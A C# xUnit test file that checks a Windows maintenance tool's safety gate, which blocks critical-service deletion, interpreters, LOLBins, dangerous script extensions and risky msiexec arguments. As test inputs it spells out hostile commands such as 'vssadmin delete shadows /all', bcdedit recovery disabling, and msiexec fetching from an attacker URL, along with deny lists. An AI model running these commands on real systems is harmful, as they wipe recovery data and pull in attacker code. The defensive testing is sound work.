using WindowsCareKit.Core.Planning;
using WindowsCareKit.Core.Safety;
using WindowsCareKit.Tests.TestInfra;
using WindowsCareKit.Win32;
using Xunit;

namespace WindowsCareKit.Tests;

public class SafetyGateServiceTaskCommandTests
{
    [Theory]
    [InlineData("RpcSs")]
    [InlineData("Dnscache")]
    [InlineData("WinDefend")]
    [InlineData("mpssvc")]
    [InlineData("TrustedInstaller")]
    public void Blocks_deleting_critical_services(string name)
    {
        var v = TestData.Gate().Evaluate(TestData.Service(name));
        Assert.False(v.Allowed, "should block service: " + name);
    }

    [Theory]
    [InlineData("SomeVendorUpdateService")]
    [InlineData("GoogleUpdate")]
    public void Allows_deleting_third_party_services(string name)
    {
        var v = TestData.Gate().Evaluate(TestData.Service(name));
        Assert.True(v.Allowed, v.Reason);
    }

    [Fact]
    public void Blocks_empty_service_name()
        => Assert.False(TestData.Gate().Evaluate(TestData.Service("")).Allowed);

    // ---- L1: security/update services are protected from Disable/Delete (but a transient Stop is allowed) ----

    [Theory]
    [InlineData("wuauserv")]   // Windows Update
    [InlineData("WdNisSvc")]   // Defender network inspection
    [InlineData("Sense")]      // Defender EDR sensor
    [InlineData("wscsvc")]     // Security Center
    [InlineData("BITS")]
    [InlineData("WSearch")]
    public void Blocks_disable_of_a_security_or_update_service(string name)
    {
        var v = TestData.Gate().Evaluate(TestData.Service(name, ServiceOperation.Disable));
        Assert.False(v.Allowed, "should block disable: " + name);
    }

    [Theory]
    [InlineData("wuauserv")]
    [InlineData("WdNisSvc")]
    [InlineData("WSearch")]
    public void Blocks_delete_of_a_security_or_update_service(string name)
    {
        var v = TestData.Gate().Evaluate(TestData.Service(name, ServiceOperation.Delete));
        Assert.False(v.Allowed, "should block delete: " + name);
    }

    [Theory]
    [InlineData("wuauserv")]
    [InlineData("WSearch")]
    public void Allows_a_transient_stop_of_a_security_or_update_service(string name)
    {
        // A Stop is reversible (the SCM/boot restarts it); only persistent Disable/Delete are refused.
        var v = TestData.Gate().Evaluate(TestData.Service(name, ServiceOperation.Stop));
        Assert.True(v.Allowed, v.Reason);
    }

    [Theory]
    [InlineData("\\Microsoft\\Windows\\Defrag\\ScheduledDefrag")]
    [InlineData("\\Microsoft\\Windows")]
    [InlineData("Microsoft\\Windows\\UpdateOrchestrator\\Reboot")] // no leading slash
    public void Blocks_deleting_os_scheduled_tasks(string path)
    {
        var v = TestData.Gate().Evaluate(TestData.Task(path));
        Assert.False(v.Allowed, "should block task: " + path);
    }

    [Theory]
    [InlineData("\\SomeVendor\\Updater")]
    [InlineData("\\GoogleUpdateTaskMachineUA")]
    public void Allows_deleting_third_party_tasks(string path)
    {
        var v = TestData.Gate().Evaluate(TestData.Task(path));
        Assert.True(v.Allowed, v.Reason);
    }

    [Theory]
    [InlineData("cmd.exe")]
    [InlineData("powershell.exe")]
    [InlineData("pwsh.exe")]
    [InlineData("wscript.exe")]
    [InlineData("cscript.exe")]
    [InlineData("mshta.exe")]
    [InlineData("reg.exe")]
    [InlineData(@"C:\Windows\System32\cmd.exe")]
    public void Blocks_shell_and_script_interpreters(string file)
    {
        var v = TestData.Gate().Evaluate(TestData.Command(file, "/c", "whatever"));
        Assert.False(v.Allowed, "should block command: " + file);
    }

    [Theory]
    [InlineData(@"C:\Program Files\SomeApp\unins000.exe")]                              // rooted vendor uninstaller
    [InlineData(@"C:\Users\alice\AppData\Local\Microsoft\WindowsApps\winget.exe")]      // resolved-absolute winget
    public void Allows_rooted_non_interpreter_executables(string file)
    {
        var v = TestData.Gate().Evaluate(TestData.Command(file, "/SILENT"));
        Assert.True(v.Allowed, v.Reason);
    }

    // Phase-1 (D): the gate treats any "msiexec" stem as the trusted MSI path (uninstall-only arg policy), so it
    // must be PINNED to %SystemRoot%\System32\msiexec.exe. The planner-pinned System32 form stays allowed; a bare
    // (PATH-searched) or spoofed msiexec is now intentionally blocked so a registry string cannot smuggle it.
    [Fact]
    public void Allows_system32_pinned_msiexec_uninstall()
        => Assert.True(TestData.Gate().Evaluate(TestData.Command(
            @"C:\Windows\System32\msiexec.exe", "/x{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}")).Allowed);

    [Fact]
    public void Blocks_bare_msiexec_uninstall()
        => Assert.False(TestData.Gate().Evaluate(TestData.Command(
            "msiexec.exe", "/x{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}")).Allowed,
            "bare msiexec must be blocked (Phase-1 D: must be the pinned System32 binary)");

    [Theory]
    [InlineData("winget.exe")]      // bare name → PATH-hijack risk
    [InlineData("pnputil.exe")]
    [InlineData("unins000.exe")]
    public void Blocks_bare_non_msiexec_command(string file)
        => Assert.False(TestData.Gate().Evaluate(TestData.Command(file, "/x")).Allowed);

    [Theory]
    [InlineData(@"C:\Windows\System32\rundll32.exe")]   // LOLBin, even absolute
    [InlineData(@"C:\Windows\System32\certutil.exe")]
    [InlineData(@"C:\Windows\System32\msbuild.exe")]
    [InlineData("cmd")]                                  // bare, no extension
    [InlineData("powershell.exe.")]                      // trailing dot
    public void Blocks_lolbins_and_interpreters(string file)
        => Assert.False(TestData.Gate().Evaluate(TestData.Command(file, "x")).Allowed);

    // Pinned to System32 so the install-verb / TRANSFORMS rules are what block (not the Phase-1 (D) path pin).
    [Theory]
    [InlineData(@"C:\Windows\System32\msiexec.exe", "/i", "{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}")]   // install verb
    [InlineData(@"C:\Windows\System32\msiexec.exe", "/i", "http://attacker/evil.msi")]                  // install + URL
    [InlineData(@"C:\Windows\System32\msiexec.exe", "/x{GUID}", "TRANSFORMS=evil.mst")]
    public void Blocks_msiexec_non_uninstall(params string[] cmd)
        => Assert.False(TestData.Gate().Evaluate(TestData.Command(cmd[0], cmd[1..])).Allowed);

    [Theory]
    [InlineData(@"C:\App\u.exe", @"\\attacker\share\evil")]   // UNC in args
    [InlineData(@"C:\App\u.exe", "https://attacker/evil")]    // URL in args
    [InlineData(@"C:\App\u.exe", "-EncodedCommand")]          // encoded command
    public void Blocks_dangerous_arguments(string file, string arg)
        => Assert.False(TestData.Gate().Evaluate(TestData.Command(file, arg)).Allowed);

    [Fact]
    public void Blocks_unc_command_path()
        => Assert.False(TestData.Gate().Evaluate(TestData.Command(@"\\server\share\u.exe")).Allowed);

    [Fact]
    public void Blocks_empty_command()
        => Assert.False(TestData.Gate().Evaluate(TestData.Command("")).Allowed);

    [Fact]
    public void Blocks_copy_into_windows_directory()
    {
        var v = TestData.Gate().Evaluate(TestData.Copy(@"C:\src\file", @"C:\Windows\System32\evil.dll"));
        Assert.False(v.Allowed);
    }

    [Fact]
    public void Allows_copy_into_user_folder()
    {
        var v = TestData.Gate().Evaluate(TestData.Copy(@"C:\src\file", @"C:\Users\alice\AppData\Roaming\App\config.json"));
        Assert.True(v.Allowed, v.Reason);
    }

    [Fact]
    public void Blocks_restore_merge_onto_profile_root()
    {
        var v = TestData.Gate().Evaluate(TestData.Restore(@"C:\backup\x", @"C:\Users\alice"));
        Assert.False(v.Allowed);
    }

    // ---- Audit Item 1: LOLBin deny-stem expansion (registry UninstallString → admin-binary abuse) ----
    // The headline vector: an attacker-controlled UninstallString runs "vssadmin delete shadows /all"
    // (ransomware anti-recovery) elevated through the uninstall flow. These admin binaries are never a
    // legitimate uninstaller, so they are now denied at the command gate.

    [Fact]
    public void Blocks_vssadmin_delete_shadows_command()
    {
        // The exact ransomware anti-recovery invocation, pinned to its real System32 path.
        var v = TestData.Gate().Evaluate(
            TestData.Command(@"C:\Windows\System32\vssadmin.exe", "delete", "shadows", "/all", "/quiet"));
        Assert.False(v.Allowed, "vssadmin delete shadows must be blocked at the command gate");
    }

    [Fact]
    public void Blocks_bcdedit_command()
    {
        var v = TestData.Gate().Evaluate(
            TestData.Command(@"C:\Windows\System32\bcdedit.exe", "/set", "{default}", "recoveryenabled", "no"));
        Assert.False(v.Allowed, "bcdedit must be blocked at the command gate");
    }

    [Theory]
    [InlineData("vssadmin")]
    [InlineData("bcdedit")]
    [InlineData("cipher")]
    [InlineData("fsutil")]
    [InlineData("diskpart")]
    [InlineData("schtasks")]
    [InlineData("sc")]
    [InlineData("net")]
    [InlineData("net1")]
    [InlineData("taskkill")]
    [InlineData("takeown")]
    [InlineData("icacls")]
    [InlineData("netsh")]
    public void Blocks_every_expanded_lolbin_stem(string stem)
    {
        var v = TestData.Gate().Evaluate(TestData.Command($@"C:\Windows\System32\{stem}.exe", "x"));
        Assert.False(v.Allowed, "should block expanded LOLBin stem: " + stem);
    }

    // POSITIVE counter-tests (Item 1 must NOT over-block legitimate uninstall flows):

    [Fact]
    public void Item1_still_allows_pinned_system32_msiexec_uninstall()
    {
        // A real msiexec uninstall at its pinned System32 path must remain allowed — the deny-stem
        // expansion must not collateral-damage the legitimate uninstall path.
        var v = TestData.Gate().Evaluate(
            TestData.Command(@"C:\Windows\System32\msiexec.exe", "/x", "{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}"));
        Assert.True(v.Allowed, v.Reason);
    }

    [Fact]
    public void Item1_still_allows_a_benign_app_uninstaller()
    {
        // A normal vendor uninstaller exe (rooted, not a LOLBin) stays allowed.
        var v = TestData.Gate().Evaluate(
            TestData.Command(@"C:\Program Files\SomeApp\unins000.exe", "/SILENT"));
        Assert.True(v.Allowed, v.Reason);
    }

    // ---- Audit Item 4: msiexec /L /log writes an arbitrary attacker-named file (data-loss) ----

    [Fact]
    public void Blocks_msiexec_uninstall_with_a_log_switch()
    {
        // /L*v <path> makes msiexec CREATE/TRUNCATE the named file — here a victim document. Pinned to System32
        // so the LOG-switch rule is what blocks (not the Phase-1 (D) path pin).
        var v = TestData.Gate().Evaluate(TestData.Command(
            @"C:\Windows\System32\msiexec.exe", "/x", "{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}", "/L*v", @"C:\victim\important.docx"));
        Assert.False(v.Allowed, "msiexec logging switch must be blocked (arbitrary file write)");
    }

    [Theory]
    [InlineData("/log")]
    [InlineData("/l")]
    [InlineData("/L*v")]
    public void Blocks_msiexec_any_log_token_form(string logArg)
    {
        var v = TestData.Gate().Evaluate(TestData.Command(
            @"C:\Windows\System32\msiexec.exe", "/x", "{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}", logArg, @"C:\victim\x.docx"));
        Assert.False(v.Allowed, "should block msiexec log token: " + logArg);
    }

    // POSITIVE counter-tests (Item 4 must NOT over-block a legitimate quiet uninstall):

    // Pinned to System32 so the LOG-switch policy (Item 4) is what these exercise, not the Phase-1 (D) path pin.
    [Fact]
    public void Item4_still_allows_msiexec_quiet_uninstall_qn()
    {
        var v = TestData.Gate().Evaluate(TestData.Command(
            @"C:\Windows\System32\msiexec.exe", "/x", "{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}", "/qn"));
        Assert.True(v.Allowed, v.Reason);
    }

    [Fact]
    public void Item4_still_allows_msiexec_quiet_norestart_uninstall()
    {
        var v = TestData.Gate().Evaluate(TestData.Command(
            @"C:\Windows\System32\msiexec.exe", "/x", "{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}", "/quiet", "/norestart"));
        Assert.True(v.Allowed, v.Reason);
    }

    // ============================================================================================
    // Command-policy hardening PHASE 1 — (A) 8.3 expansion, (B) script-ext block, (D) msiexec System32 pin.
    // Each BLOCK rule has a paired ALLOW counter-test proving Phase 1 does NOT over-block legitimate flows.
    // ============================================================================================

    // ---- (A) 8.3 short-name resolution: a short alias of a LOLBin expands to the denied stem ----

    [Fact]
    public void PhaseA_blocks_8_3_short_name_alias_of_a_lolbin()
    {
        // VSSADM~1.EXE is the 8.3 alias of vssadmin.exe. The gate must EXPAND it (mirroring the file-delete
        // branch) BEFORE deriving the stem, so it resolves to "vssadmin" and is caught by the deny-stems.
        var canon = new FakeCanonicalizer()
            .MapLongPath(@"C:\Windows\System32\VSSADM~1.EXE", @"C:\Windows\System32\vssadmin.exe");

        var v = TestData.Gate(canon).Evaluate(TestData.Command(
            @"C:\Windows\System32\VSSADM~1.EXE", "delete", "shadows", "/all", "/quiet"));

        Assert.False(v.Allowed, "8.3 alias of vssadmin must expand and be blocked");
    }

    [FactRequires8Dot3]
    public void PhaseA_blocks_a_real_os_8_3_alias_of_a_denied_stem()
    {
        // Real-OS round-trip (mirrors Win32CanonicalizerTests.ExpandLongPath_round_trips...): create a real file
        // whose 10-char leaf "powershell.exe" the OS gives a distinct 8.3 leaf alias (e.g. POWERS~1.EXE), ask the
        // OS for that genuine short form, then assert the gate — wired to the REAL Win32 canonicalizer — expands
        // it back to the denied stem ("powershell") and BLOCKS. Host-safe: temp only. Statically skipped when
        // 8dot3name is disabled on this volume (never a silent vacuous pass).
        string dir = Path.Combine(Path.GetTempPath(), "wck-cmd83-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(dir);
        try
        {
            string longExe = Path.Combine(dir, "powershell.exe");
            File.WriteAllText(longExe, "x");

            string? shortExe = ShortNameInterop.TryGetShortPathName(longExe);
            Assert.NotNull(shortExe);
            Assert.NotEqual(longExe, shortExe, StringComparer.OrdinalIgnoreCase);
            // The short LEAF must differ — this is what proves the gate has to expand the leaf, not just the dir.
            Assert.NotEqual(
                Path.GetFileName(longExe), Path.GetFileName(shortExe!), StringComparer.OrdinalIgnoreCase);

            var gate = new SafetyGate(ProtectedResources.ForCurrentSystem(), new Win32PathCanonicalizer());
            var v = gate.Evaluate(TestData.Command(shortExe!, "-Command", "Get-Process"));

            Assert.False(v.Allowed, "real-OS 8.3 alias of powershell must expand and be blocked: " + shortExe);
        }
        finally
        {
            try { if (Directory.Exists(dir)) TestFs.DeleteResilient(dir); } catch { /* ignore */ }
        }
    }

    // ---- (B) dangerous script/container extensions blocked on the expanded leaf ----

    [Theory]
    [InlineData(".ps1")]
    [InlineData(".psm1")]
    [InlineData(".vbs")]
    [InlineData(".vbe")]
    [InlineData(".js")]
    [InlineData(".jse")]
    [InlineData(".wsf")]
    [InlineData(".wsh")]
    [InlineData(".hta")]
    [InlineData(".scr")]
    [InlineData(".msc")]
    [InlineData(".com")]
    [InlineData(".pif")]
    [InlineData(".cpl")]
    public void PhaseB_blocks_dangerous_script_or_container_extensions(string ext)
    {
        // A rooted, non-LOLBin-stem path that nonetheless ends in a script/container extension must be blocked.
        var v = TestData.Gate().Evaluate(TestData.Command($@"C:\Program Files\Evil\wrapper{ext}", "/quiet"));
        Assert.False(v.Allowed, "should block dangerous extension: " + ext);
    }

    [Theory]
    [InlineData(".bat")]
    [InlineData(".cmd")]
    public void PhaseB_does_not_block_bat_or_cmd_at_the_gate(string ext)
    {
        // The npm tripwire at the EXTENSION level: .bat/.cmd must NOT be in the gate's denied-extension set
        // (npm ships as npm.cmd). A rooted .cmd with benign args stays allowed.
        var v = TestData.Gate().Evaluate(TestData.Command(
            $@"C:\Program Files\nodejs\tool{ext}", "install", "-g", "--ignore-scripts", "somepkg"));
        Assert.True(v.Allowed, v.Reason);
    }

    // ---- (D) msiexec pinned to System32 (spoofed path blocked) ----

    [Fact]
    public void PhaseD_blocks_spoofed_msiexec_outside_system32()
    {
        // A registry string could point "msiexec" at C:\Temp\msiexec.exe; the gate must not grant it the MSI
        // trust just because the stem is "msiexec". Anything but the pinned System32 binary is blocked.
        var v = TestData.Gate().Evaluate(TestData.Command(
            @"C:\Temp\msiexec.exe", "/x", "{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}"));
        Assert.False(v.Allowed, "spoofed C:\\Temp\\msiexec.exe must be blocked (not the System32 binary)");
    }

    [Fact]
    public void PhaseD_still_allows_pinned_system32_msiexec_uninstall()
    {
        // Paired ALLOW: the planner-pinned System32 form (what production always uses) stays allowed.
        var v = TestData.Gate().Evaluate(TestData.Command(
            @"C:\Windows\System32\msiexec.exe", "/x", "{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}", "/qn"));
        Assert.True(v.Allowed, v.Reason);
    }

    // ---- Phase-1 over-block guard: legitimate uninstall/install executables stay ALLOWED ----

    [Fact]
    public void Phase1_still_allows_program_files_uninstaller()
    {
        // (6) C:\Program Files\App\unins000.exe /SILENT — identity canonicalization, real .exe.
        var v = TestData.Gate().Evaluate(TestData.Command(
            @"C:\Program Files\SomeApp\unins000.exe", "/SILENT"));
        Assert.True(v.Allowed, v.Reason);
    }

    [Fact]
    public void Phase1_still_allows_resolved_winget_auto_entry()
    {
        // (8) a resolved-absolute winget under WindowsApps stays allowed (a real .exe, no dangerous ext/stem).
        var v = TestData.Gate().Evaluate(TestData.Command(
            @"C:\Users\alice\AppData\Local\Microsoft\WindowsApps\winget.exe",
            "install", "--id", "Google.Chrome", "-e", "--silent"));
        Assert.True(v.Allowed, v.Reason);
    }

    [Fact]
    public void Phase1_still_allows_nsis_uninstaller_from_temp()
    {
        // (10) NSIS copies its uninstaller to %TEMP%\~nsu.tmp\Au_.exe and re-launches it with _?=<dir>. This
        // MUST still pass — proving Phase 1 did NOT add an InstallLocation/exe-root anchor (that is Phase 2).
        string nsis = Path.Combine(Path.GetTempPath(), "~nsu.tmp", "Au_.exe");
        var v = TestData.Gate().Evaluate(TestData.Command(
            nsis, "/S", @"_?=C:\Program Files\SomeApp"));
        Assert.True(v.Allowed, v.Reason);
    }

    [Fact]
    public void Phase1_still_allows_per_user_uninstaller_under_localappdata()
    {
        // (11) a per-user app's uninstaller under %LOCALAPPDATA% stays allowed.
        string perUser = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Programs", "SomeApp", "Uninstall.exe");
        var v = TestData.Gate().Evaluate(TestData.Command(perUser, "/S"));
        Assert.True(v.Allowed, v.Reason);
    }
}
